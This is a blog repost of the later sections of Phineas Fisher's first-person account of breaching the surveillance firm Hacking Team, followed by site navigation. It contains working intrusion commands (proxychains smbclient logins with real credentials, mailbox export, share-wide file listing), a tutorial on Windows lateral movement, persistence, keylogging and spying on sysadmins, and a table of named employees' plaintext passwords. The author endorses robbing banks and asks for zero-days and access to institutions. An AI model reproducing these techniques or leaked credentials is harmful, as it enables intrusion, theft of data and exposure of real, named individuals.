<p>now in /mnt/exchange/WindowsImageBackup/EXCHANGE/Backup 2014-10-14 172311<br>we find the hard disk of the VM, and mount it:<br>vdfuse -r -t VHD -f f0f78089-d28a-11e2-a92c-005056996a44.vhd /mnt/vhd-disk/<br>mount -o loop /mnt/vhd-disk/Partition1 /mnt/part1</p>
<p>…and finally we’ve unpacked the Russian doll and can see all the files from<br>the old Exchange server in /mnt/part1</p>
<p>[1] <a href="https://ht.transparencytoolkit.org/FileServer/FileServer/Hackingteam/InfrastrutturaIT/Rete/infrastruttura%20ht.pdf" target="_blank" rel="external">https://ht.transparencytoolkit.org/FileServer/FileServer/Hackingteam/InfrastrutturaIT/Rete/infrastruttura%20ht.pdf</a></p>
<p>–[ 10 - From backups to domain admin ]—————————————–</p>
<p>What interested me most in the backup was seeing if it had a password or hash<br>that could be used to access the live server. I used pwdump, cachedump, and<br>lsadump [1] on the registry hives. lsadump found the password to the besadmin<br>service account:</p>
<p>_SC_BlackBerry MDS Connection Service<br>0000   16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    …………….<br>0010   62 00 65 00 73 00 33 00 32 00 36 00 37 00 38 00    b.e.s.3.2.6.7.8.<br>0020   21 00 21 00 21 00 00 00 00 00 00 00 00 00 00 00    !.!.!………..</p>
<p>I used proxychains [2] with the socks server on the embedded device and<br>smbclient [3] to check the password:<br>proxychains smbclient ‘//192.168.100.51/c$’ -U ‘hackingteam.local/besadmin%bes32678!!!’</p>
<p>It worked! The password for besadmin was still valid, and a local admin. I<br>used my proxy and metasploit’s psexec_psh [4] to get a meterpreter session.<br>Then I migrated to a 64 bit process, ran “load kiwi” [5], “creds_wdigest”, and<br>got a bunch of passwords, including the Domain Admin:</p>
<p>HACKINGTEAM  BESAdmin       bes32678!!!<br>HACKINGTEAM  Administrator  uu8dd8ndd12!<br>HACKINGTEAM  c.pozzi        P4ssword      &lt;—- lol great sysadmin<br>HACKINGTEAM  m.romeo        ioLK/(90<br>HACKINGTEAM  l.guerra       4luc@=.=<br>HACKINGTEAM  d.martinez     W4tudul3sp<br>HACKINGTEAM  g.russo        GCBr0s0705!<br>HACKINGTEAM  a.scarafile    Cd4432996111<br>HACKINGTEAM  r.viscardi     Ht2015!<br>HACKINGTEAM  a.mino         A!e$$andra<br>HACKINGTEAM  m.bettini      Ettore&amp;Bella0314<br>HACKINGTEAM  m.luppi        Blackou7<br>HACKINGTEAM  s.gallucci     1S9i8m4o!<br>HACKINGTEAM  d.milan        set!dob66<br>HACKINGTEAM  w.furlan       Blu3.B3rry!<br>HACKINGTEAM  d.romualdi     Rd13136f@#<br>HACKINGTEAM  l.invernizzi   L0r3nz0123!<br>HACKINGTEAM  e.ciceri       2O2571&amp;2E<br>HACKINGTEAM  e.rabe         erab@4HT!</p>
<p>[1] <a href="https://github.com/Neohapsis/creddump7" target="_blank" rel="external">https://github.com/Neohapsis/creddump7</a><br>[2] <a href="http://proxychains.sourceforge.net/" target="_blank" rel="external">http://proxychains.sourceforge.net/</a><br>[3] <a href="https://www.samba.org/" target="_blank" rel="external">https://www.samba.org/</a><br>[4] <a href="http://ns2.elhacker.net/timofonica/manuales/Manual_de_Metasploit_Unleashed.pdf" target="_blank" rel="external">http://ns2.elhacker.net/timofonica/manuales/Manual_de_Metasploit_Unleashed.pdf</a><br>[5] <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz</a></p>
<p>–[ 11 - Downloading the mail ]————————————————-</p>
<p>With the Domain Admin password, I have access to the email, the heart of the<br>company. Since with each step I take there’s a chance of being detected, I<br>start downloading their email before continuing to explore. Powershell makes<br>it easy [1]. Curiously, I found a bug with Powershell’s date handling. After<br>downloading the emails, it took me another couple weeks to get access to the<br>source code and everything else, so I returned every now and then to download<br>the new emails. The server was Italian, with dates in the format<br>day/month/year. I used:<br>-ContentFilter {(Received -ge ‘05/06/2015’) -or (Sent -ge ‘05/06/2015’)}</p>
<p>with New-MailboxExportRequest to download the new emails (in this case all<br>mail since June 5). The problem is it says the date is invalid if you<br>try a day larger than 12 (I imagine because in the US the month comes first<br>and you can’t have a month above 12). It seems like Microsoft’s engineers only<br>test their software with their own locale.</p>
<p>[1] <a href="http://www.stevieg.org/2010/07/using-the-exchange-2010-sp1-mailbox-export-features-for-mass-exports-to-pst/" target="_blank" rel="external">http://www.stevieg.org/2010/07/using-the-exchange-2010-sp1-mailbox-export-features-for-mass-exports-to-pst/</a></p>
<p>–[ 12 - Downloading Files ]—————————————————-</p>
<p>Now that I’d gotten Domain Admin, I started to download file shares using my<br>proxy and the -Tc option of smbclient, for example:</p>
<p>proxychains smbclient ‘//192.168.1.230/FAE DiskStation’ \<br>-U ‘HACKINGTEAM/Administrator%uu8dd8ndd12!’ -Tc FAE_DiskStation.tar ‘*’</p>
<p>I downloaded the Amministrazione, FAE DiskStation, and FileServer folders in<br>the torrent like that.</p>
<p>–[ 13 - Introduction to hacking windows domains ]——————————</p>
<p>Before continuing with the story of the “weones culiaos” (Hacking Team), I<br>should give some general knowledge for hacking windows networks.</p>
<p>—-[ 13.1 - Lateral Movement ]————————————————-</p>
<p>I’ll give a brief review of the different techniques for spreading withing a<br>windows network. The techniques for remote execution require the password or<br>hash of a local admin on the target. By far, the most common way of obtaining<br>those credentials is using mimikatz [1], especially sekurlsa::logonpasswords<br>and sekurlsa::msv, on the computers where you already have admin access. The<br>techniques for “in place” movement also require administrative privileges<br>(except for runas). The most important tools for privilege escalation are<br>PowerUp [2], and bypassuac [3].</p>
<p>[1] <a href="https://adsecurity.org/?page_id=1821" target="_blank" rel="external">https://adsecurity.org/?page_id=1821</a><br>[2] <a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp" target="_blank" rel="external">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp</a><br>[3] <a href="https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Invoke-BypassUAC.ps1" target="_blank" rel="external">https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Invoke-BypassUAC.ps1</a></p>
<p>Remote Movement:</p>
<p>1) psexec</p>
<p>The tried and true method for lateral movement on windows. You can use<br>psexec [1], winexe [2], metasploit’s psexec_psh [3], Powershell Empire’s<br>invoke_psexec [4], or the builtin windows command “sc” [5]. For the<br>metasploit module, powershell empire, and pth-winexe [6], you just need the<br>hash, not the password. It’s the most universal method (it works on any<br>windows computer with port 445 open), but it’s also the least stealthy.<br>Event type 7045 “Service Control Manager” will appear in the event logs. In<br>my experience, no one has ever noticed during a hack, but it helps the<br>investigators piece together what the hacker did afterwards.</p>
<p>2) WMI</p>
<p>The most stealthy method. The WMI service is enabled on all windows<br>computers, but except for servers, the firewall blocks it by default. You<br>can use wmiexec.py [7], pth-wmis [6] (here’s a demonstration of wmiexec and<br>pth-wmis [8]), Powershell Empire’s invoke_wmi [9], or the windows builtin<br>wmic [5]. All except wmic just need the hash.</p>
<p>3) PSRemoting [10]</p>
<p>It’s disabled by default, and I don’t recommend enabling new protocols.<br>But, if the sysadmin has already enabled it, it’s very convenient,<br>especially if you use powershell for everything (and you should use<br>powershell for almost everything, it will change [11] with powershell 5 and<br>windows 10, but for now powershell makes it easy to do everything in RAM,<br>avoid AV, and leave a small footprint)</p>
<p>4) Scheduled Tasks</p>
<p>You can execute remote programs with at and schtasks [5]. It works in the<br>same situations where you could use psexec, and it also leaves a well known<br>footprint [12].</p>
<p>5) GPO</p>
<p>If all those protocols are disabled or blocked by the firewall, once you’re<br>Domain Admin, you can use GPO to give users a login script, install an msi,<br>execute a scheduled task [13], or, like we’ll see with the computer of<br>Mauro Romeo (one of Hacking Team’s sysadmins), use GPO to enable WMI and<br>open the firewall.</p>
<p>[1] <a href="https://technet.microsoft.com/en-us/sysinternals/psexec.aspx" target="_blank" rel="external">https://technet.microsoft.com/en-us/sysinternals/psexec.aspx</a><br>[2] <a href="https://sourceforge.net/projects/winexe/" target="_blank" rel="external">https://sourceforge.net/projects/winexe/</a><br>[3] <a href="https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh" target="_blank" rel="external">https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh</a><br>[4] <a href="http://www.powershellempire.com/?page_id=523" target="_blank" rel="external">http://www.powershellempire.com/?page_id=523</a><br>[5] <a href="http://blog.cobaltstrike.com/2014/04/30/lateral-movement-with-high-latency-cc/" target="_blank" rel="external">http://blog.cobaltstrike.com/2014/04/30/lateral-movement-with-high-latency-cc/</a><br>[6] <a href="https://github.com/byt3bl33d3r/pth-toolkit" target="_blank" rel="external">https://github.com/byt3bl33d3r/pth-toolkit</a><br>[7] <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="external">https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py</a><br>[8] <a href="https://www.trustedsec.com/june-2015/no_psexec_needed/" target="_blank" rel="external">https://www.trustedsec.com/june-2015/no_psexec_needed/</a><br>[9] <a href="http://www.powershellempire.com/?page_id=124" target="_blank" rel="external">http://www.powershellempire.com/?page_id=124</a><br>[10] <a href="http://www.maquinasvirtuales.eu/ejecucion-remota-con-powershell/" target="_blank" rel="external">http://www.maquinasvirtuales.eu/ejecucion-remota-con-powershell/</a><br>[11] <a href="https://adsecurity.org/?p=2277" target="_blank" rel="external">https://adsecurity.org/?p=2277</a><br>[12] <a href="https://www.secureworks.com/blog/where-you-at-indicators-of-lateral-movement-using-at-exe-on-windows-7-systems" target="_blank" rel="external">https://www.secureworks.com/blog/where-you-at-indicators-of-lateral-movement-using-at-exe-on-windows-7-systems</a><br>[13] <a href="https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/lateral_movement/new_gpo_immediate_task.py" target="_blank" rel="external">https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/lateral_movement/new_gpo_immediate_task.py</a></p>
<p>“In place” Movement:</p>
<p>1) Token Stealing</p>
<p>Once you have admin access on a computer, you can use the tokens of the<br>other users to access resources in the domain. Two tools for doing this are<br>incognito [1] and the mimikatz token::* commands [2].</p>
<p>2) MS14-068</p>
<p>You can take advantage of a validation bug in Kerberos to generate Domain<br>Admin tickets [3][4][5].</p>
<p>3) Pass the Hash</p>
<p>If you have a user’s hash, but they’re not logged in, you can use<br>sekurlsa::pth [2] to get a ticket for the user.</p>
<p>4) Process Injection</p>
<p>Any RAT can inject itself into other processes. For example, the migrate<br>command in meterpreter and pupy [6], or the psinject [7] command in<br>powershell empire. You can inject into the process that has the token you<br>want.</p>
<p>5) runas</p>
<p>This is sometimes very useful since it doesn’t require admin privileges.<br>The command is part of windows, but if you don’t have a GUI you can use<br>powershell [8].</p>
<p>[1] <a href="https://www.indetectables.net/viewtopic.php?p=211165" target="_blank" rel="external">https://www.indetectables.net/viewtopic.php?p=211165</a><br>[2] <a href="https://adsecurity.org/?page_id=1821" target="_blank" rel="external">https://adsecurity.org/?page_id=1821</a><br>[3] <a href="https://github.com/bidord/pykek" target="_blank" rel="external">https://github.com/bidord/pykek</a><br>[4] <a href="https://adsecurity.org/?p=676" target="_blank" rel="external">https://adsecurity.org/?p=676</a><br>[5] <a href="http://www.hackplayers.com/2014/12/CVE-2014-6324-como-validarse-con-cualquier-usuario-como-admin.html" target="_blank" rel="external">http://www.hackplayers.com/2014/12/CVE-2014-6324-como-validarse-con-cualquier-usuario-como-admin.html</a><br>[6] <a href="https://github.com/n1nj4sec/pupy" target="_blank" rel="external">https://github.com/n1nj4sec/pupy</a><br>[7] <a href="http://www.powershellempire.com/?page_id=273" target="_blank" rel="external">http://www.powershellempire.com/?page_id=273</a><br>[8] <a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1" target="_blank" rel="external">https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1</a></p>
<p>—-[ 13.2 - Persistence ]——————————————————</p>
<p>Once you have access, you want to keep it. Really, persistence is only a<br>challenge for assholes like Hacking Team who target activists and other<br>individuals. To hack companies, persistence isn’t needed since companies never<br>sleep. I always use Duqu 2 style “persistence”, executing in RAM on a couple<br>high-uptime servers. On the off chance that they all reboot at the same time,<br>I have passwords and a golden ticket [1] as backup access. You can read more<br>about the different techniques for persistence in windows here [2][3][4]. But<br>for hacking companies, it’s not needed and it increases the risk of detection.</p>
<p>[1] <a href="http://blog.cobaltstrike.com/2014/05/14/meterpreter-kiwi-extension-golden-ticket-howto/" target="_blank" rel="external">http://blog.cobaltstrike.com/2014/05/14/meterpreter-kiwi-extension-golden-ticket-howto/</a><br>[2] <a href="http://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/" target="_blank" rel="external">http://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/</a><br>[3] <a href="http://www.hexacorn.com/blog/category/autostart-persistence/" target="_blank" rel="external">http://www.hexacorn.com/blog/category/autostart-persistence/</a><br>[4] <a href="https://blog.netspi.com/tag/persistence/" target="_blank" rel="external">https://blog.netspi.com/tag/persistence/</a></p>
<p>—-[ 13.3 - Internal reconnaissance ]——————————————</p>
<p>The best tool these days for understanding windows networks is Powerview [1].<br>It’s worth reading everything written by it’s author [2], especially [3], [4],<br>[5], and [6]. Powershell itself is also quite powerful [7]. As there are still<br>many windows 2000 and 2003 servers without powershell, you also have to learn<br>the old school [8], with programs like netview.exe [9] or the windows builtin<br>“net view”. Other techniques that I like are:</p>
<p>1) Downloading a list of file names</p>
<p>With a Domain Admin account, you can download a list of all filenames in<br>the network with powerview:</p>
<p>Invoke-ShareFinderThreaded -ExcludedShares IPC$,PRINT$,ADMIN$ |<br>select-string ‘^(.*) \t-‘ | %{dir -recurse $_.Matches[0].Groups[1] |<br>select fullname | out-file -append files.txt}</p>
<p>Later, you can read it at your leisure and choose which files to download.</p>
<p>2) Reading email</p>
<p>As we’ve already seen, you can download email with powershell, and it has a<br>lot of useful information.</p>
<p>3) Reading sharepoint</p>
<p>It’s another place where many businesses store a lot of important<br>information. It can also be downloaded with powershell [10].</p>
<p>4) Active Directory [11]</p>
<p>It has a lot of useful information about users and computers. Without being<br>Domain Admin, you can already get a lot of info with powerview and other<br>tools [12]. After getting Domain Admin, you should export all the AD<br>information with csvde or another tool.</p>
<p>5) Spy on the employees</p>
<p>One of my favorite hobbies is hunting sysadmins. Spying on Christian Pozzi<br>(one of Hacking Team’s sysadmins) gave me access to a Nagios server which<br>gave me access to the rete sviluppo (development network with the source<br>code of RCS). With a simple combination of Get-Keystrokes and<br>Get-TimedScreenshot from PowerSploit [13], Do-Exfiltration from nishang<br>[14], and GPO, you can spy on any employee, or even on the whole domain.</p>
<p>[1] <a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView" target="_blank" rel="external">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a><br>[2] <a href="http://www.harmj0y.net/blog/tag/powerview/" target="_blank" rel="external">http://www.harmj0y.net/blog/tag/powerview/</a><br>[3] <a href="http://www.harmj0y.net/blog/powershell/veil-powerview-a-usage-guide/" target="_blank" rel="external">http://www.harmj0y.net/blog/powershell/veil-powerview-a-usage-guide/</a><br>[4] <a href="http://www.harmj0y.net/blog/redteaming/powerview-2-0/" target="_blank" rel="external">http://www.harmj0y.net/blog/redteaming/powerview-2-0/</a><br>[5] <a href="http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/" target="_blank" rel="external">http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/</a><br>[6] <a href="http://www.slideshare.net/harmj0y/i-have-the-powerview" target="_blank" rel="external">http://www.slideshare.net/harmj0y/i-have-the-powerview</a><br>[7] <a href="https://adsecurity.org/?p=2535" target="_blank" rel="external">https://adsecurity.org/?p=2535</a><br>[8] <a href="https://www.youtube.com/watch?v=rpwrKhgMd7E" target="_blank" rel="external">https://www.youtube.com/watch?v=rpwrKhgMd7E</a><br>[9] <a href="https://github.com/mubix/netview" target="_blank" rel="external">https://github.com/mubix/netview</a><br>[10] <a href="https://blogs.msdn.microsoft.com/rcormier/2013/03/30/how-to-perform-bulk-downloads-of-files-in-sharepoint/" target="_blank" rel="external">https://blogs.msdn.microsoft.com/rcormier/2013/03/30/how-to-perform-bulk-downloads-of-files-in-sharepoint/</a><br>[11] <a href="https://adsecurity.org/?page_id=41" target="_blank" rel="external">https://adsecurity.org/?page_id=41</a><br>[12] <a href="http://www.darkoperator.com/?tag=Active+Directory" target="_blank" rel="external">http://www.darkoperator.com/?tag=Active+Directory</a><br>[13] <a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="external">https://github.com/PowerShellMafia/PowerSploit</a><br>[14] <a href="https://github.com/samratashok/nishang" target="_blank" rel="external">https://github.com/samratashok/nishang</a></p>
<p>–[ 14 - Hunting Sysadmins ]—————————————————-</p>
<p>Reading their documentation about their infrastructure [1], I saw that I was<br>still missing access to something important - the “Rete Sviluppo”, an isolated<br>network with the source code for RCS. The sysadmins of a company always have<br>access to everything, so I searched the computers of Mauro Romeo and Christian<br>Pozzi to see how they administer the Sviluppo network, and to see if there<br>were any other interesting systems I should investigate. It was simple to<br>access their computers, since they were part of the windows domain where I’d<br>already gotten admin access. Mauro Romeo’s computer didn’t have any ports<br>open, so I opened the port for WMI [2] and executed meterpreter [3]. In<br>addition to keylogging and screen scraping with Get-Keystrokes and<br>Get-TimeScreenshot, I used many /gather/ modules from metasploit, CredMan.ps1<br>[4], and searched for interesting files [5]. Upon seeing that Pozzi had a<br>Truecrypt volume, I waited until he’d mounted it and then copied off the<br>files. Many have made fun of Christian Pozzi’s weak passwords (and of<br>Christian Pozzi in general, he provides plenty of material [6][7][8][9]). I<br>included them in the leak as a false clue, and to laugh at him. The reality is<br>that mimikatz and keyloggers view all passwords equally.</p>
<p>[1] <a href="http://hacking.technology/Hacked%20Team/FileServer/FileServer/Hackingteam/InfrastrutturaIT/" target="_blank" rel="external">http://hacking.technology/Hacked%20Team/FileServer/FileServer/Hackingteam/InfrastrutturaIT/</a><br>[2] <a href="http://www.hammer-software.com/wmigphowto.shtml" target="_blank" rel="external">http://www.hammer-software.com/wmigphowto.shtml</a><br>[3] <a href="https://www.trustedsec.com/june-2015/no_psexec_needed/" target="_blank" rel="external">https://www.trustedsec.com/june-2015/no_psexec_needed/</a><br>[4] <a href="https://gallery.technet.microsoft.com/scriptcenter/PowerShell-Credentials-d44c3cde" target="_blank" rel="external">https://gallery.technet.microsoft.com/scriptcenter/PowerShell-Credentials-d44c3cde</a><br>[5] <a href="http://pwnwiki.io/#!presence/windows/find_files.md" target="_blank" rel="external">http://pwnwiki.io/#!presence/windows/find_files.md</a><br>[6] <a href="http://archive.is/TbaPy" target="_blank" rel="external">http://archive.is/TbaPy</a><br>[7] <a href="http://hacking.technology/Hacked%20Team/c.pozzi/screenshots/" target="_blank" rel="external">http://hacking.technology/Hacked%20Team/c.pozzi/screenshots/</a><br>[8] <a href="http://hacking.technology/Hacked%20Team/c.pozzi/Desktop/you.txt" target="_blank" rel="external">http://hacking.technology/Hacked%20Team/c.pozzi/Desktop/you.txt</a><br>[9] <a href="http://hacking.technology/Hacked%20Team/c.pozzi/credentials/" target="_blank" rel="external">http://hacking.technology/Hacked%20Team/c.pozzi/credentials/</a></p>
<p>–[ 15 - The bridge ]———————————————————–</p>
<p>Within Christian Pozzi’s Truecrypt volume, there was a textfile with many<br>passwords [1]. One of those was for a Fully Automated Nagios server, which had<br>access to the Sviluppo network in order to monitor it. I’d found the bridge I<br>needed. The textfile just had the password to the web interface, but there was<br>a public code execution exploit [2] (it’s an unauthenticated exploit, but it<br>requires that at least one user has a session initiated, for which I used the<br>password from the textfile).</p>
<p>[1] <a href="http://hacking.technology/Hacked%20Team/c.pozzi/Truecrypt%20Volume/Login%20HT.txt" target="_blank" rel="external">http://hacking.technology/Hacked%20Team/c.pozzi/Truecrypt%20Volume/Login%20HT.txt</a><br>[2] <a href="http://seclists.org/fulldisclosure/2014/Oct/78" target="_blank" rel="external">http://seclists.org/fulldisclosure/2014/Oct/78</a></p>
<p>–[ 16 - Reusing and resetting passwords ]————————————–</p>
<p>Reading the emails, I’d seen Daniele Milan granting access to git repos. I<br>already had his windows password thanks to mimikatz. I tried it on the git<br>server and it worked. Then I tried sudo and it worked. For the gitlab server<br>and their twitter account, I used the “forgot my password” function along with<br>my access to their mail server to reset the passwords.</p>
<p>–[ 17 - Conclusion ]———————————————————–</p>
<p>That’s all it takes to take down a company and stop their human rights abuses.<br>That’s the beauty and asymmetry of hacking: with 100 hours of work, one person<br>can undo years of work by a multi-million dollar company. Hacking gives the<br>underdog a chance to fight and win.</p>
<p>Hacking guides often end with a disclaimer: this information is for<br>educational purposes only, be an ethical hacker, don’t attack systems you<br>don’t have permission to, etc. I’ll say the same, but with a more rebellious<br>conception of “ethical” hacking. Leaking documents, expropriating money from<br>banks, and working to secure the computers of ordinary people is ethical<br>hacking. However, most people that call themselves “ethical hackers” just work<br>to secure those who pay their high consulting fees, who are often those most<br>deserving to be hacked.</p>
<p>Hacking Team saw themselves as part of a long line of inspired Italian design<br>[1]. I see Vincenzetti, his company, his cronies in the police, Carabinieri,<br>and government, as part of a long tradition of Italian fascism. I’d like to<br>dedicate this guide to the victims of the raid on the Armando Diaz school, and<br>to all those who have had their blood spilled by Italian fascists.</p>
<p>[1] <a href="https://twitter.com/coracurrier/status/618104723263090688" target="_blank" rel="external">https://twitter.com/coracurrier/status/618104723263090688</a></p>
<p>–[ 18 - Contact ]————————————————————–</p>
<p>To send me spear phishing attempts, death threats in Italian [1][2], and to<br>give me 0days or access inside banks, corporations, governments, etc.</p>
<p>[1] <a href="http://andres.delgado.ec/2016/01/15/el-miedo-de-vigilar-a-los-vigilantes/" target="_blank" rel="external">http://andres.delgado.ec/2016/01/15/el-miedo-de-vigilar-a-los-vigilantes/</a><br>[2] <a href="https://twitter.com/CthulhuSec/status/619459002854977537" target="_blank" rel="external">https://twitter.com/CthulhuSec/status/619459002854977537</a></p>
<p>only encrypted email please:<br><a href="https://securityinabox.org/es/thunderbird_usarenigmail" target="_blank" rel="external">https://securityinabox.org/es/thunderbird_usarenigmail</a><br>—–BEGIN PGP PUBLIC KEY BLOCK—–</p>
<p>mQENBFVp37MBCACu0rMiDtOtn98NurHUPYyI3Fua+bmF2E7OUihTodv4F/N04KKx<br>vDZlhKfgeLVSns5oSimBKhv4Z2bzvvc1w/00JH7UTLcZNbt9WGxtLEs+C+jF9j2g<br>27QIfOJGLFhzYm2GYWIiKr88y95YLJxvrMNmJEDwonTECY68RNaoohjy/TcdWA8x<br>+fCM4OHxM4AwkqqbaAtqUwAJ3Wxr+Hr/3KV+UNV1lBPlGGVSnV+OA4m8XWaPE73h<br>VYMVbIkJzOXK9enaXyiGKL8LdOHonz5LaGraRousmiu8JCc6HwLHWJLrkcTI9lP8<br>Ms3gckaJ30JnPc/qGSaFqvl4pJbx/CK6CwqrABEBAAG0IEhhY2sgQmFjayEgPGhh<br>Y2tiYWNrQHJpc2V1cC5uZXQ+iQE3BBMBCgAhBQJXAvPFAhsDBQsJCAcDBRUKCQgL<br>BRYCAwEAAh4BAheAAAoJEDScPRHoqSXQoTwIAI8YFRdTptbyEl6Khk2h8+cr3tac<br>QdqVNDdp6nbP2rVPW+o3DeTNg0R+87NAlGWPg17VWxsYoa4ZwKHdD/tTNPk0Sldf<br>cQE+IBfSaO0084d6nvSYTpd6iWBvCgJ1iQQwCq0oTgROzDURvWZ6lwyTZ8XK1KF0<br>JCloCSnbXB8cCemXnQLZwjGvBVgQyaF49rHYn9+edsudn341oPB+7LK7l8vj5Pys<br>4eauRd/XzYqxqNzlQ5ea6MZuZZL9PX8eN2obJzGaK4qvxQ31uDh/YiP3MeBzFJX8<br>X2NYUOYWm3oxiGQohoAn//BVHtk2Xf7hxAY4bbDEQEoDLSPybZEXugzM6gC5AQ0E<br>VWnfswEIANaqa8fFyiiXYWJVizUsVGbjTTO7WfuNflg4F/q/HQBYfl4ne3edL2Ai<br>oHOGg0OMNuhNrs56eLRyB/6IjM3TCcfn074HL37eDT0Z9p+rbxPDPFOJAMFYyyjm<br>n5a6HfmctRzjEXccKFaqlwalhnRP6MRFZGKU6+x1nXbiW8sqGEH0a/VdCR3/CY5F<br>Pbvmhh894wOzivUlP86TwjWGxLu1kHFo7JDgp8YkRGsXv0mvFav70QXtHllxOAy9<br>WlBP72gPyiWQ/fSUuoM+WDrMZZ9ETt0j3Uwx0Wo42ZoOXmbAd2jgJXSI9+9e4YUo<br>jYYjoU4ZuX77iM3+VWW1J1xJujOXJ/sAEQEAAYkBHwQYAQIACQUCVWnfswIbDAAK<br>CRA0nD0R6Kkl0ArYB/47LnABkz/t6M1PwOFvDN3e2JNgS1QV2YpBdog1hQj6RiEA<br>OoeQKXTEYaymUwYXadSj7oCFRSyhYRvSMb4GZBa1bo8RxrrTVa0vZk8uA0DB1ZZR<br>LWvSR7nwcUkZglZCq3Jpmsy1VLjCrMC4hXnFeGi9AX1fh28RYHudh8pecnGKh+Gi<br>JKp0XtOqGF5NH/Zdgz6t+Z8U++vuwWQaubMJTRdMTGhaRv+jIzKOiO9YtPNamHRq<br>Mf2vA3oqf22vgWQbK1MOK/4Tp6MGg/VR2SaKAsqyAZC7l5TeoSPN5HdEgA7u5GpB<br>D0lLGUSkx24yD1sIAGEZ4B57VZNBS0az8HoQeF0k<br>=E5+y<br>—–END PGP PUBLIC KEY BLOCK—–</p>
<pre><code>If not you, who? If not now, when?
</code></pre><hr>
<p>| | | | <strong> <em>  </em></strong>| | <strong> | </strong> )  <strong> <em>  </em></strong>| | <em>| |<br>| |</em>| |/ <em>` |/ __| |/ / |  </em> \ / <em>` |/ __| |/ / |<br>|  </em>  | (<em>| | (__|   &lt;  | |</em>) | (<em>| | (__|   &lt;|</em>|<br>|<em>| |</em>|_<em>,</em>|_<strong>|<em>|\</em>\ |__</strong>/ _<em>,</em>|__<em>|</em>|_(_)</p>

      
    </div>

    <div class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/渗透测试/"> #渗透测试 </a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-prev post-nav-item">
            
              <a href="/2017/03/03/drones-operating-in-syria-and-iraq/">(商用)无人机在叙利亚和伊拉克战场的应用</a>
            
          </div>

          <div class="post-nav-next post-nav-item">
            
              <a href="/2017/03/02/locked-shields/">北约卓越联合网络防卫中心举行 Crossed Swords 2017 演习</a>
            
          </div>
        </div>
      

      
      
    </div>
  </div>



    
      <div class="post-spread">
        <!-- JiaThis Button BEGIN -->
<div class="jiathis_style">
  <a class="jiathis_button_tsina"></a>
  <a class="jiathis_button_tqq"></a>
  <a class="jiathis_button_weixin"></a>
  <a class="jiathis_button_cqq"></a>
  <a class="jiathis_button_douban"></a>
  <a class="jiathis_button_renren"></a>
  <a class="jiathis_button_qzone"></a>
  <a class="jiathis_button_kaixin001"></a>
  <a class="jiathis_button_copy"></a>
  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
  <a class="jiathis_counter_style"></a>
</div>
<script type="text/javascript" >
  var jiathis_config={
    hideMore:false
  }
</script>
<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
<!-- JiaThis Button END -->

      </div>
    

    
      <div class="comments" id="comments">
        
          <div class="ds-thread" data-thread-key="2017/03/03/pentesting-hacking-team/"
               data-title="Phineas Fisher 渗透 Hacking Team， 过程与思路" data-url="http://blkstone.github.io/2017/03/03/pentesting-hacking-team/">
          </div>
        
      </div>
    
  </div>


        </div>

        
      </div>


      
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <div id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目錄
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            本站概覽
          </li>
        </ul>
      

      <div class="site-overview">
        <div class="site-author motion-element">
          <img class="site-author-image" src="/images/avatar.jpg" alt="Ray" />
          <p class="site-author-name">Ray</p>
        </div>
        <p class="site-description motion-element">关于计算机科学的学习经历与精彩文章分享。</p>
        <div class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">504</span>
              <span class="site-state-item-name">文章</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            
              <span class="site-state-item-count">15</span>
              <span class="site-state-item-name">分類</span>
              
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">148</span>
              <span class="site-state-item-name">標籤</span>
              </a>
          </div>

        </div>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
            </span>
            
              <span class="links-of-author-item">
              <a href="http://blkstone.github.io/" target="_blank">Twitter</a>
            </span>
            
              <span class="links-of-author-item">
              <a href="http://blkstone.github.io/" target="_blank">Weibo</a>
            </span>
            
              <span class="links-of-author-item">
              <a href="http://blkstone.github.io/" target="_blank">DouBan</a>
            </span>
            
              <span class="links-of-author-item">
              <a href="http://blkstone.github.io/" target="_blank">ZhiHu</a>
            </span>
            
          
        </div>

        
        
          <div class="cc-license motion-element">
            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
            </a>
          </div>
        

      </div>

      
        <div class="post-toc-wrap sidebar-panel-active">
